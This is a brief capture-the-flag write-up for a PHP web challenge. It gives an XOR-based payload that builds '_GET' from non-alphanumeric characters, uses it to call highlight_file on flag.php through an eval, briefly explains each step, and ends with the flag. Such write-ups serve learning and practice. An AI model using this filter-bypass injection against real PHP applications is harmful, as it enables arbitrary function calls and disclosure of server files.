**Challenge:** http://69.90.132.196:5003/?view-source

Reference: https://ctf-wiki.github.io/ctf-wiki/web/php/php/

Payload: `$_="``{{{"^"?<>/";${$_}[_](${$_}[__]);&_=highlight_file&__=flag.php`

Explaning:
  - $_="`{{{"^"?<>/"; | Result of xor operation: $_ = "_GET"
  - ${$_}[_](${$_}[__]); | $_GET[_]($_GET[__])
  - Eval function will be: eval(highlight_file('flag.php'))

[Get the flag](http://69.90.132.196:5003/?view-source)

**Flag**: ASIS{w4rm_up_y0ur_br4in}
